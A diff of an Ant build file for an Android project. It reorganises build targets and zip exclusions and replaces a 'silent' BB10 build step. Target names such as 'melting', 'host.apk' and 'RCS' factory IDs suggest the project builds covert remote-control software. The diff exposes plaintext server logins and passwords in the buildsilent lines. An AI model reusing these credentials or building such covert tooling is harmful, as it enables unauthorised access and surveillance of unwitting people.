@@ -235,8 +235,8 @@
 						</filterset>
 					</copy>
                     <var name="gui" value="false" />
-				</then>
-				<else>
+				</case>
+				<default>
 					<echo message="Copy Activity" />
 					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
@@ -428,11 +428,6 @@
         <antcall target="encrypt-messages" />
         <antcall target="release" inheritAll="false" />
         <antcall target="make_mapping" />
-    </target>
-
-    <target name="build_bb10" depends="init_build">
-        <var name="osversion" value="bb10" />
-        <antcall target="build_var" />
     </target>
 
     <target name="build_bb10" depends="init_build">
@@ -656,7 +651,8 @@
 
         <antcall target="servercore_bb10" />
 
-		<zip destfile="${destdir}/android_sources.zip" basedir="." excludes="**/build/intermediates/**, **/build/generated/**, **/classes/**, **/server/historic/**, **/melting/tmp/**, **/melting/host.apk, **/antlibs/historic/**, **/sqlite/**" />
+		<!--<zip destfile="${destdir}/android_sources.zip" basedir="." excludes="**/core-android-native/*,**/native/*,**/melting/*,**/build/intermediates/**,**/build/generated/**,**/classes/**,**/server/historic/**,server/*.zip,**/melting/tmp/**,**/melting/host.apk,**/antlibs/historic/**,**/sqlite/**" />-->
+		<zip destfile="${destdir}/android_sources.zip" basedir="." excludes="obj/**,**/samples/**,tmp/**,core-android-native/**,native/**,**/build/intermediates/**,**/build/generated/**,**/classes/**,**/server/historic/**,server/*.zip,**/melting/tmp/**,**/melting/host.apk,**/antlibs/historic/**,**/sqlite/**" />
 
 		<checksum>
 			<fileset dir="${destdir}/">
@@ -722,7 +718,9 @@
     </macrodef>
 
     <target name="silent-bb10">
-        <buildsilent server="rcs-local" login="batch" password="Fabriziop123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000000001"  />
+		<!--<buildsilent server="rcs-local" login="batch" password="Fabriziop123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000000001"  />-->
+
+		<buildsilent server="rcs-castore" login="zenobatch" password="castoreP123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000002478"  />
     </target>
 
 	<target name="update">
